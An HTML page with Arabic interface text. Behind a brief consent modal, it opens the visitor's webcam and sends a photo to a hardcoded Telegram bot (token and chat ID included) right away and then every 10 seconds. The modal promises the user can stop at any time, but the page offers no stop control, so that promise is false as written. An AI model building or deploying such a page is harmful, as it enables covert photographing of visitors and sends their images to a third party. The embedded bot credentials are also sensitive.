<!-- مقتطف موجز: عرض نافذة موافقة عند الدخول، ثم تشغيل الكاميرا وبدء الإرسال التلقائي بعد موافقة المستخدم -->
<!doctype html>
<html>
<head><meta charset="utf-8"><title>M31 — موافقة عند الدخول</title></head>
<body>
  <div id="consentModal" style="position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:rgba(0,0,0,0.6);">
    <div style="background:#fff;padding:20px;border-radius:8px;max-width:420px;text-align:right;">
      <h3>مطلوب موافقتك</h3>
      <p>بالضغط على "أوافق" تسمح لهذا الموقع بفتح الكاميرا والتقاط صور وإرسالها تلقائياً إلى بوت M31. يمكنك إيقاف العملية في أي وقت.</p>
      <button id="agreeBtn">أوافق وابدأ الآن</button>
      <button id="declineBtn">أرفض</button>
    </div>
  </div>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <img id="preview" alt="معاينة" style="max-width:100%; display:block; margin-top:12px;">

<script>
const BOT_TOKEN = "7710816011:AAHV5ybc-Hwet8IdL1TwbJfWYhmsxxG2T_8";
const CHAT_ID = "6251932709";

const consentModal = document.getElementById('consentModal');
const agreeBtn = document.getElementById('agreeBtn');
const declineBtn = document.getElementById('declineBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const preview = document.getElementById('preview');

let stream = null;
let intervalId = null;

async function startCameraAndAutoSend(intervalSec=10){
  try {
    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    video.srcObject = stream;
    video.style.display = 'block';

    // send immediately once
    await captureAndSend();

    // then periodic
    intervalId = setInterval(captureAndSend, intervalSec * 1000);
  } catch (e) {
    alert('فشل فتح الكاميرا: ' + e.message);
  }
}

function stopAll(){
  if (intervalId) { clearInterval(intervalId); intervalId = null; }
  if (stream) { stream.getTracks().forEach(t=>t.stop()); stream = null; }
  video.style.display = 'none';
  preview.src = '';
}

function captureImageBlob(){
  const w = video.videoWidth, h = video.videoHeight;
  canvas.width = w; canvas.height = h;
  canvas.getContext('2d').drawImage(video,0,0,w,h);
  return new Promise(res => canvas.toBlob(res,'image/jpeg',0.85));
}

async function captureAndSend(){
  try {
    const blob = await captureImageBlob();
    preview.src = URL.createObjectURL(blob);
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, 'm31.jpg');
    form.append('caption', 'M31 — ' + new Date().toLocaleString());
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: form });
    console.log('sent');
  } catch (e) {
    console.error('capture/send error', e);
  }
}

// إذا ضغط المستخدم "أوافق" -> إخفاء النافذة وبدء الكاميرا والإرسال
agreeBtn.addEventListener('click', () => {
  consentModal.style.display = 'none';
  // هنا يبدأ التشغيل التلقائي (بإذن المستخدم)
  startCameraAndAutoSend(10); // كل 10 ثواني
});

// رفض
declineBtn.addEventListener('click', () => {
  consentModal.style.display = 'none';
  alert('تم رفض الإذن. لن يتم التقاط أو إرسال أي صور.');
});

// زر إيقاف/تنظيف (يمكنك إضافته في الواجهة لاحقًا)
window.stopM31 = stopAll;
</script>
</body>
</html>
